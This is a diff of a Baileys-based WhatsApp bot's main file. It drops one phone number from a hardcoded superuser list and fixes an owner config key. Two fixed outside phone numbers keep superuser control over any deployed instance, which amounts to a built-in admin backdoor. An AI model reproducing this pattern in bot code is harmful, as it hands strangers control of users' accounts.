@@ -13,7 +13,7 @@ ______     __     __     __    __        __  __     __    __     _____
 
                    
 const { default: makeWASocket, isJidGroup, superUser, imageMessage, CommandSystem, repondre, verifierEtatJid, recupererActionJid, DisconnectReason, getMessageText, commandRegistry, delay, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, jidDecode, getContentType } = require("@whiskeysockets/baileys");
-const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"].map(num => num + "@s.whatsapp.net");
+const SUDO_NUMBERS = ["254727716045","254710772666"].map(num => num + "@s.whatsapp.net");
 const logger = require("@whiskeysockets/baileys/lib/Utils/logger").default.child({});
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
@@ -207,7 +207,7 @@ adams.ev.on("messages.upsert", async (m) => {
 
         // Define Owner and Sudo Users
         const BOT_OWNER = conf.OWNER_NUMBER;
-        const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"]
+        const SUDO_NUMBERS = ["254727716045", "254710772666"]
             .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");
 
         const superUserNumbers = [servBot, BOT_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
@@ -367,7 +367,7 @@ adams.ev.on("messages.upsert", async ({ messages }) => {
    // console.log(`📩 New message from: ${ms.key.remoteJid}`);
 
     const senderJid = ms.key.participant || ms.key.remoteJid;
-    const superUser = SUDO_NUMBERS.includes(senderJid) || senderJid === `${conf.NUMERO_OWNER}@s.whatsapp.net`;
+    const superUser = SUDO_NUMBERS.includes(senderJid) || senderJid === `${conf.OWNER_NUMBER}@s.whatsapp.net`;
 
     const texte = ms?.message?.conversation || ms?.message?.extendedTextMessage?.text || "";
     const arg = texte ? texte.trim().split(/\s+/).slice(1) : [];
